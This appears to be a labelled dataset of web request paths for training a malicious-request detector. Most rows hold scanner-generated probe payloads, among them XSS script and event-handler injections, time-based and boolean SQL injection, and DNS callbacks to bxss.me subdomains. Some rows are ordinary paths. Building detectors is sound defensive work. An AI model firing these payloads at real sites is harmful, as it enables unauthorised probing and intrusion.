sentences	labels
socket.gethostbyname(""hitde"" ""mluirsua1ba1e.bxss.me."")[3].to_s) ""/****/10/11/art_34_242318.html \r\n\r\n 	 1
/*****/system/2021/11/17/javascript:void(); \r\n\r\n 	 1
/xwzx'||'/****/2021_mtgz/202105/t20210505_273338.html \r\n\r\n 	 1
/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/******/jslib/'""()&%<acx><script >gejm(9283)</script>/jquery.ad-gallery.js \r\n\r\n 	 1
/jsearchfront'||'/********/jcse/110105008056111/16/images/plugin/voice/voicerecorder.js \r\n\r\n 	 1
/****/system/2020/07/21/javascript:void(); \r\n\r\n 	 1
/****/xxgkzd/list.html?new=/xfs.bxss.me \r\n\r\n 	 1
/*******/202007/202007222122341228.html \r\n\r\n 	 1
/*****/tools_log_setting.php?action_post=something&send_mail=--><script>alert(777)</script>&apply=save settings&log_sys=1&log_dbg=1&log_att=1&log_drp=1&log_ntc=1&email_addr=&subject=&sender=&srv=&srv_port=25 \r\n\r\n 	 1
/****/减贫?page='""()&%<acx><script >zsnv(9860)</script> \r\n\r\n 	 1
/****/phpliteadmin_v1-1/phpliteadmin.php?table=""/>alert(777) \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_webid[0]==extractvalue(1,concat(char(126),md5(1585232043)))and 3 in &i_columnid=1&i_webid[1]=3&type=1 \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_articleid=242398&i_columnid=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&i_webid=1&type=3 \r\n\r\n 	 1
/****/zjdt/csjs/gzdt/13.htm \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' or 4576=4576 and '%%'='% \r\n\r\n 	 1
/**********/2021-if(now()=sysdate(),sleep(9),0)-02 .html \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(390)">?_=1630311387505 \r\n\r\n 	 1
/***/index.php?do=post&id=419&c=dt&a=goods& \r\n\r\n 	 1
/************/recommend/census.do?redirectaction:http://static.bxss.me/ \r\n\r\n 	 1
/*******/admin/index.php?o=panel&a=receiver.edit&id=alert(777) \r\n\r\n 	 1
/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/****/jzgl/gzdt/1.htm \r\n\r\n 	 1
/zwfw' and 2*3*8=6*8 and 'xsle'='xsle/****/1.htm \r\n\r\n 	 1
/***/admin/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> \r\n\r\n 	 1
/*/doinfo/addinfo.php?submit=添加信息&classid=1&enews=maddinfo&mid='""()&%<acx><script >87cm(9833)</script> \r\n\r\n 	 1
/****/zfxxgk1/zfxxgkzd/0""xor(if(now()=sysdate(),sleep(12),0))xor""z.htm \r\n\r\n 	 1
/****/jgzn/znjs' and 2*3*8=6*8 and 'fbxf'='fbxf.htm \r\n\r\n 	 1
/****/zfxxgk<esi:include src=""http://bxss.me/rpb.png""/>/fdzdgknr/qtfdxx/ \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images/plugin/websitechange/zwfwv3.js/""><script>alert(4710)</script> \r\n\r\n 	 1
/****/szyw/2020_szyw/ and 1=1 \r\n\r\n 	 1
/************/template/jcse/110105008056111/**/and/**/7659=7659/16/images/view.js \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/'""()&%<acx><script >qamc(9033)</script>/main.css \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml_2127/lzyj/list.html?new=bxss.me/t/xss.html? \r\n\r\n 	 1
/****/byszf/http://bxss.me/t/fit.txt?.jpg/202108/t20210806_185416.html \r\n\r\n 	 1
/****/system/2017/04/05/javascript:window.print() \r\n\r\n 	 1
/******/20190808'; select @@version,1,1,1--.swf \r\n\r\n 	 1
socket.gethostbyname('hitcx' 'aetwgyshf3a9b.bxss.me.')[3].to_s) '/******/result.css \r\n\r\n 	 1
/**/index.php?show_record_links=1&table=products"">alert(777);&add_new_item=1 \r\n\r\n 	 1
/****/mytag_js.php?aid=6022 \r\n\r\n 	 1
/****/zfwjn/1088/1091/list.html?new=0.23628304015921864'""()&%<acx><script >grpf(9380)</script> \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448') or 4394=0062 and '1'='1 \r\n\r\n 	 1
/******/system/2021/09/10/javascript:window.print() \r\n\r\n 	 1
/****/system/2008/01/04/javascript:window.print() \r\n\r\n 	 1
/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/******/ywdt/11.htm \r\n\r\n 	 1
/**/telaen/index.php?tid=default&lid=en_uk&f_email="">alert(777) \r\n\r\n 	 1
/*****/system/2021/01/21/013323672'""/>%uff1cscript%uff1ealert%uff081143%uff09%uff1c/script%uff1e.shtml \r\n\r\n 	 1
/******/xsd/javascript:void(0) \r\n\r\n 	 1
/****/category/siluyiliao?page=1'"()&%<acu><script>9112(9131)</script> \r\n\r\n 	 1
/**/phpwiki/index.php?pagename=</script><script>alert(777)</script><!-- \r\n\r\n 	 1
/****/zdlygk/ncwywfgz/szss/plq/xmb_gzdxb%' and 2*3*8=6*8 and 'rneu'!='rneu%.htm \r\n\r\n 	 1
/******/jslib'||'/grouppic/jquery.ad-gallery2.css \r\n\r\n 	 1
/******/index.cfm?email="">alert(777)&fuseaction=clogin.main&returnurl=1&status=sendlogin \r\n\r\n 	 1
/****/category/gaocengdongtai?page=1' or 2462=2462 /* \r\n\r\n 	 1
/**/bxss.me/lib/jquery/jquery.min.js \r\n\r\n 	 1
/******/zh-cn/listbox/;"style='acu:expre/**/ssion(x4cp(9599))'bad=" \r\n\r\n 	 1
/***/admin/upgrade_unattended.php?db_type=<script>alert(777)</script> \r\n\r\n 	 1
/*/zwdhhz/index.shtml \r\n\r\n 	 1
socket.gethostbyname('hitmx' 'htrncijocc232.bxss.me.')[3].to_s) '/******/zmhdyc.html \r\n\r\n 	 1
/*****/system/2013/05/03/011077792.shtml \r\n\r\n 	 1
/************/'""()&%<acx><script >vpin(9807)</script>/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid.js \r\n\r\n 	 1
/****/20210622/javascript:void(0); \r\n\r\n 	 1
/****/system/2021/11/24/javascript:dozoom(12) \r\n\r\n 	 1
/**************/2020-09-22/javascript:void(0) \r\n\r\n 	 1
/****/zdlygk/ncwywfgz%' and 2*3*8=6*8 and '0wrz'!='0wrz%/szss/plq/xmb_gzdxb.htm \r\n\r\n 	 1
/*****/system/2014/12/23/011591237.shtml?ivk_sa=1024320u \r\n\r\n 	 1
/****/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 1
/**/sydt/201808/t20180808_194915.html' and 'x'='y \r\n\r\n 	 1
/****/bxss.me/xxdj/ \r\n\r\n 	 1
/******/web/jpage/bxss.me.js \r\n\r\n 	 1
/*******/7jyc.php \r\n\r\n 	 1
/******/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 1
/******/resource/js/news/if(now()=sysdate(),sleep(12),0).js \r\n\r\n 	 1
/************/template/bxss.me/110105008056111/16/images/common.js \r\n\r\n 	 1
/**/dorg/results.php?q='"--></style></script><script>alert(777)</script>&search=search&type=3 \r\n\r\n 	 1
/****/mavideo/gvideos.php?gid=1 and 1=2 \r\n\r\n 	 1
/****/yqzt/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/gjjj/201608/t20160804_93597.html' and 'x'='y \r\n\r\n 	 1
/*/201020-1/videos-detail/4e8c38de2e5ef1a81f429ac1992d4cf2'""()&%<acx><script >ejwv(9896)</script>.css \r\n\r\n 	 1
//***********/zzxxgk/tjj/zfxxgkml_2127/jytabljg_2061/list.html \r\n\r\n 	 1
/*/191211-8/index/543527http://bxss.me/t/xss.html? \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(4694)</script>?_=1630312101338 \r\n\r\n 	 1
/****/index.php?show_record_links=1&table=products"">alert(777);&add_new_item=1 \r\n\r\n 	 1
/****/xydt/2017hydt_6392/ \r\n\r\n 	 1
/******/visitcount/visit.jsp?type=>"'><script>alert(2059)</script>&i_webid=>"'><script>alert(2059)</script>&i_columnid=>"'><script>alert(2059)</script>&i_articleid=>"'><script>alert(2059)</script> \r\n\r\n 	 1
socket.gethostbyname('hitoi' 'kglbxleaf7bf3.bxss.me.')[3].to_s) '/**/art_34_242318.html \r\n\r\n 	 1
/***********/jinrongqihuo/0'xor(if(now()=sysdate(),sleep(6),0))xor'z/index_2.html \r\n\r\n 	 1
/****/category/xinhuaqiyezixun?page='""()&%<acx><script >dgqe(9340)</script> \r\n\r\n 	 1
socket.gethostbyname(""hitvw"" ""svhrikna978d3.bxss.me."")[3].to_s) ""/***/easyui/plugins/jquery.panel.js \r\n\r\n 	 1
/****/goform/formwlansetup?apmode=0&band=2&ssid=&chan=11&macaddrvalue=&wlanmacclone=0&wlanmac=&automacclone=no&repeaterssid=&wllinkmac1=&wllinkmac2=&wllinkmac3=&wllinkmac4=&wllinkmac5=&wllinkmac6=&x=54&y=12&wlan-url=test>alert(777)test \r\n\r\n 	 1
/*******/0xnw6.php \r\n\r\n 	 1
/**/index.php?do=post&id=280&c=dt&a=goods& \r\n\r\n 	 1
/******/visitcount/visit.jsp?type=1'; select @@version,1,1,1--&i_webid=1&i_columnid=1 \r\n\r\n 	 1
/****/ssgs/ and 1=1 \r\n\r\n 	 1
/****/category/zhixun?page=1 and 6768=6768# \r\n\r\n 	 1
/****/byysqgk' and 2*3*8=6*8 and 'hoa6'='hoa6/ybjsqzn/list.html \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(6509)">?_=1630312351836 \r\n\r\n 	 1
/***/800/10/87/32/10873219_948757.jpg \r\n\r\n 	 1
/**********/system/2021/11/13/javascript:window.print() \r\n\r\n 	 1
/****/byszx/201611/t20161121_76519.html?leader='.gethostbyname(lc('hitdz'.'hrceevxs76832.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(116).chr(68).chr(113).chr(86).' \r\n\r\n 	 1
/****/system/2016/11/10/javascript:window.close(); \r\n\r\n 	 1
/****/zzxxgk/tjj/?wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") \r\n\r\n 	 1
/*********/file/twphp.cer \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime') and 4422=0276 and '1'='1&perpage=15&outlinepage=10 \r\n\r\n 	 1
/*****/javascript/bxslider-4/jquery.bxslider.js \r\n\r\n 	 1
/**********/system/2021/12/18/javascript:window.print() \r\n\r\n 	 1
/****/gccb/xnygc/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/**/slash-cms/index.php?mod=sl_pages&id=alert(777) \r\n\r\n 	 1
/****/zfwjn/1088/1097/list.html?new=/xfs.bxss.me \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images'""()&%<acx><script >uzie(9579)</script>/main.css \r\n\r\n 	 1
/***********/image/about_img.jpg \r\n\r\n 	 1
/****/bxss.me/t/xss.html? \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml_if(now()=sysdate(),sleep(15),0)/hygq_2064/list.html \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448%' or 0611=0019 and '%%'='%&wbfileid=51419 \r\n\r\n 	 1
/**//xfs.bxss.me/css/page.css \r\n\r\n 	 1
/*/public/viewclick/?addclick=1&classid=-1); waitfor delay '0:0:8.394' -- &id=1285 \r\n\r\n 	 1
/****/bwcx/dtbb/jtdt/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/web/search?page=2&channelid=253477&searchword=1%' or 2101=2101 /*&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 1
/****/zfwjn/1088/1095/list.html?new="".gethostbyname(lc(""hitcf"".""tctoobmyab40c.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(112).chr(86).chr(112).chr(84)."" \r\n\r\n 	 1
/****/'""()&%<acx><script >ooae(9712)</script>/bmleft.html \r\n\r\n 	 1
/***/interface/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270') or 7192=7192  \r\n\r\n 	 1
/****/web/search?channelid=254846') and 4918=4211 and ('trvy'='trvy&searchword=天津 \r\n\r\n 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448' or 0876=1649 and '1'='1&wbfileid=51419 \r\n\r\n 	 1
/*****/system/2021/02/22/javascript:window.close(); \r\n\r\n 	 1
/****/zfwjn/1088/1089/list.html?new=bxss.me/t/xss.html? \r\n\r\n 	 1
/****/czgk/bmyjs/qtdw/aglyzhaggclhhy/\"javascript:void(0)\" \r\n\r\n 	 1
/*****/system/2021/12/15/javascript:window.print() \r\n\r\n 	 1
/****/system/2016/10/27/javascript:window.print() \r\n\r\n 	 1
/******/business-area%' and 2*3*8=6*8 and 'p5h6'!='p5h6%/quotation-service/ \r\n\r\n 	 1
/***/wp-admin/admin-ajax.php \r\n\r\n 	 1
/**********/2021-0""xor(if(now()=sysdate(),sleep(12),0))xor""z-04 .html \r\n\r\n 	 1
/**/wp-admin/admin.php?where1=alert(777)&searchsubmit=buscar&page=nsp_search \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml_2127/tjxx/pcsj/list.html?new="".gethostbyname(lc(""hitjq"".""ajzunypkebe55.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(107).chr(76).chr(115).chr(68)."" \r\n\r\n 	 1
/**/group-summary.jsp?search=test" onmouseover=alert(777) x=" \r\n\r\n 	 1
/******/resource/js/news%' and 2*3*8=6*8 and 'zdbz'!='zdbz%/newscontent.js \r\n\r\n 	 1
/******/system/2016/12/05/javascript:void(); \r\n\r\n 	 1
socket.gethostbyname(""hitvv"" ""tkecydzod2611.bxss.me."")[3].to_s) ""/***************/16/images/plugin/voice/hzrecorder.js \r\n\r\n 	 1
/******/download/down.jsp?i_id=23679&colid=72') and 3574=3574 and ('qflz'='qflz \r\n\r\n 	 1
/if(now()=sysdate(),sleep(18),0)/**************/2017-02-16/221.html \r\n\r\n 	 1
/****/system/2019/12/30/javascript:window.print() \r\n\r\n 	 1
/**/mswpmm/common/signin.aspx?tbemailaddress=alert(777)returnurl=/mswpmm/common/default.aspx \r\n\r\n 	 1
/****/system/2021/11/11/javascript:dozoom(14) \r\n\r\n 	 1
/******/visitcount/visit.jsp?i_columnid=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&i_webid=1&type=1 \r\n\r\n 	 1
/**/system/count/0006013/000000000000/window.location.href \r\n\r\n 	 1
/***/dsp_dp_showmonth.cfm? 5=posn 1&datelong="">alert(777) \r\n\r\n 	 1
/******/resource/code/datainput.jsp?owner=%' and 5256=5256 and '%'=' \r\n\r\n 	 1
/***/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 1
/****/system/2021/09/08/013447520'""/>//</script//>//<svg/onload=alert(1510) width=100///>.shtml \r\n\r\n 	 1
/****/zpdt/index_117.html and 1=1 \r\n\r\n 	 1
/****//xfs.bxss.me/fdzdgknr/qtfdxx/ \r\n\r\n 	 1
/**********/spellcheck.do \r\n\r\n 	 1
/*****/abantecart/index.php?currency="><script>alert(777);</script>&product_id=109"><script>alert(777);</script>&rt=product/product \r\n\r\n 	 1
//***********/ui/lib/easyui/themes/bootstrap/linkbutton.css \r\n\r\n 	 1
/******/resource/js/photoswipe/3.0.5.1/northwind/ \r\n\r\n 	 1
/*****/fiyo/?app=article&view=item31ab2"">alert(777)0ccba&id=186 \r\n\r\n 	 1
/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/****/search.jspx?q=输入关键字</textarea>--><xss_c950df5288f502249702eb255ef62bee/><!--<textarea> \r\n\r\n 	 1
/*****/system/2020/01/14/javascript:void(0); \r\n\r\n 	 1
/cgi-bin/*****/system.html?step=2&device=et"/><script>alert(777);</script>bh0 \r\n\r\n 	 1
/wp-content/*******/prism-highlight/css.php \r\n\r\n 	 1
/******/resource%' and 2*3*8=6*8 and '8kec'!='8kec%/js/newcalendar/my97datepicker.htm \r\n\r\n 	 1
/***/?refresh=</script><script>window.top._web_js_namespace_taint_tracer.log_execution_flow_sink()</script> \r\n\r\n 	 1
/****/gccb/wlgc//*/-->'""></iframe></script></style></title></textarea><script >alert(58251)</script> \r\n\r\n 	 1
/****/cyryhmd.htm/""><script>alert`01883`</script> \r\n\r\n 	 1
/****/web/search?channelid=234439&orderby=relevance</script><script>alert`83507`</script>&perpage=24&searchword=1 \r\n\r\n 	 1
/************/template/jcse/110105008056111<esi:include src=""http://bxss.me/rpb.png""/>/16/images/jquery.waterfall.js \r\n\r\n 	 1
/***/interface/daily_clickcount.json.jsp?callback=jquery171030196352313975305_1632325579270%') or 9301=9301  \r\n\r\n 	 1
/****/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319 \r\n\r\n 	 1
/******/resource/js'||'/counter.js \r\n\r\n 	 1
/module'""()&%<acx><script >gejm(9023)</script>/*****/grouppic/jquery.ad-gallery.js \r\n\r\n 	 1
/**********/system/2021/09/17/javascript:void(0); \r\n\r\n 	 1
/****/mobiledoc/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> \r\n\r\n 	 1
/******/if(now()=sysdate(),sleep(15),0)/1905151614057782.js \r\n\r\n 	 1
/****/web/search?channelid=299868%' and 8539=8539  \r\n\r\n 	 1
/***********/jinrongqihuo/guzhiqihuo' and 2*3*8=6*8 and 'w3ez'='w3ez/ \r\n\r\n 	 1
/******/_content/download.jsp?owner=if(now()=sysdate(),sleep(12),0)&urltype=news.downloadattachurl&wbfileid=51452 \r\n\r\n 	 1
/****/jtdt/2013jtdt/javascript:stranbody(); \r\n\r\n 	 1
/***/openemr/?site="">alert(777); \r\n\r\n 	 1
socket.gethostbyname('hitds' 'whdyamzq0c405.bxss.me.')[3].to_s) '/****/gdyx/ \r\n\r\n 	 1
/**/vc/interface/visit.jsp?i_articleid=0&i_columnid=195&i_webid=1&type=2&url=if(now()=sysdate(),sleep(15),0) \r\n\r\n 	 1
/****/mtgz/2019_mtgz/202012/t20201215_264991.html and 1=1 \r\n\r\n 	 1
/**/api/alert(777) \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images/plugin/http://bxss.me/t/fit.txt?.jpg/voice.css \r\n\r\n 	 1
/****/wp-admin/admin.php?where1=alert(777)&searchsubmit=buscar&page=nsp_search \r\n\r\n 	 1
/****/wp-admin/admin.php?where1=alert(777)&searchsubmit=buscar&page=nsp_search \r\n\r\n 	 1
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 1
/****/web/search?channelid=299868&perpage=1000) and 2954=5470# \r\n\r\n 	 1
/**/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php \r\n\r\n 	 1
/**********/system/2021/10/22/javascript:window.close(); \r\n\r\n 	 1
/************/search.do?category=1&cateid=40&p=1&pg=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&q=请输入关键词&tpl=16&websiteid=110105008056111 \r\n\r\n 	 1
/*****/system/2021/01/21/013323672'""/><script >alert(1131);</script >.shtml \r\n\r\n 	 1
/****/jsly/znzgjdqzdhzbyjs/201610/t20161014_103590.html' and 'x'='y \r\n\r\n 	 1
/**/ui/lib/easyui/themes"" and 2*3*8=6*8 and ""sni0""=""sni0/bootstrap/linkbutton.css \r\n\r\n 	 1
/***/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 1
/*******/202101/202101311224351011.html \r\n\r\n 	 1
/******/resource/code/datainput.jsp?owner=') or 1511=9167 and '1'='1 \r\n\r\n 	 1
/****/1124/document.location.href \r\n\r\n 	 1
/****/document.location.href \r\n\r\n 	 1
/images"" and 2*3*8=6*8 and ""ioqg""=""ioqg/*/slick.min.js \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/""><script>alert(1089)</script>?_=1630311745938 \r\n\r\n 	 1
/****/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp \r\n\r\n 	 1
/****/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp \r\n\r\n 	 1
/zwgk' and 2*3*8=6*8 and 'dwtj'='dwtj/*****/gcjsbz_sjbz/1.htm \r\n\r\n 	 1
/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/******/ncwywfgz/zws/znx/xmb_gzdxb.htm \r\n\r\n 	 1
/******/system/2021/09/17/javascript:void(0); \r\n\r\n 	 1
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 1
/****/zjdt/csjs/if(now()=sysdate(),sleep(12),0)/1.htm \r\n\r\n 	 1
/****/zzxxgk/tjj/zfxxgkml_2127/lzyj/list.html?new=0.6905497045448936&wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") \r\n\r\n 	 1
/******/resource/js/ \r\n\r\n 	 1
/***//699/93txj81c/xhr_send?t=1634940377839 \r\n\r\n 	 1
/****/index.cfm?fuseaction=clogin.main&returnurl=&status=sendlogin&email=alert(777) \r\n\r\n 	 1
/************/template/http://bxss.me/t/fit.txt/110105008056111/16/images/main.css \r\n\r\n 	 1
/zwgk' and 2*3*8=6*8 and 'vrxs'='vrxs/******/rsrm.htm \r\n\r\n 	 1
/****/category/fengxianfangfan?page=1' and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)--  \r\n\r\n 	 1
/cgi-bin/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search \r\n\r\n 	 1
/**/ui"" and 2*3*8=6*8 and ""hpgu""=""hpgu/css/global.css \r\n\r\n 	 1
/****/web/search?page=2 and 7610=2301--&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 1
/************/template/jcse/110105008056111/16/images'||'/hanweb.css \r\n\r\n 	 1
/******/gztc/? \r\n\r\n 	 1
/******/system/2018/02/25/javascript:window.print() \r\n\r\n 	 1
/*****/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319 \r\n\r\n 	 1
/***/general/diary/new/submit.php \r\n\r\n 	 1
/**/mavideo/gvideos.php?gid=1 and 1=2 \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/"><script>alert(676)</script>?_=1630311547744 \r\n\r\n 	 1
/****/bmkx/http://bxss.me/t/fit.txt?.jpg/201812/t20181208_112298.html \r\n\r\n 	 1
/****/gccb/jtysgc/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448' and 9731=9731 and '1'='1 \r\n\r\n 	 1
/****/system/2021/09/19/javascript:dozoom(9) \r\n\r\n 	 1
/******/0/bxss.me.js \r\n\r\n 	 1
socket.gethostbyname(""hitih"" ""odvykjbx400e4.bxss.me."")[3].to_s) ""/****/110105008056111/16/images/plugin/voice/hzrecorder.js \r\n\r\n 	 1
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(668)">?_=1630311544074 \r\n\r\n 	 1
/****/czgk/bmyjs/zzqjcyxt/ycsrmjcy/\"javascript:void(0)\" \r\n\r\n 	 1
/***/2021/10//xfs.bxss.me/art_32_242398.html \r\n\r\n 	 1
/**/ajax_cmd.php?cmd=completgraphyrecording&filename=<img src=a onload=alert(777)> \r\n\r\n 	 1
/**/learn/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=" onmouseover="alert(777)" \r\n\r\n 	 1
/****/status_captiveportal.php?zone='"><script>alert(777);</script> \r\n\r\n 	 1
/****/wdsjs/hfswsj/202109/t20210906_186411'""()&%<acx><script >lnxe(9700)</script>.html \r\n\r\n 	 1
/****/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search \r\n\r\n 	 1
/****/bndd/wd/javascript:void(0); \r\n\r\n 	 1
/****/state/service/166/exec \r\n\r\n 	 1
/****/api/sources?resource=alert(/777/)&format=txt \r\n\r\n 	 1
